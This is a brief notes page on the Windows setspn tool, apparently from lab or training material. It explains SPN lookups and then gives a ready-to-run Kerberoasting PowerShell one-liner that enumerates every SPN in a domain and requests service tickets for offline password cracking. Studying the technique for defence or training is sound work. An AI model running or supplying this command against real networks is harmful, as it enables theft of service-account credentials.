## setspn: choose the operation and read the result

Commands and examples collected from your setspn notes.

### What the result establishes

Map an SPN to the account that owns it; distinguish discovery queries from registration changes.

### Prerequisites and common failures

Duplicate SPNs, aliases and hostname differences affect Kerberos. A listed SPN does not establish the account's password strength.

### 3. Request Tickets from Enumerated SPNs

**Kerberoasting from Windows**

```powershell
setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
```
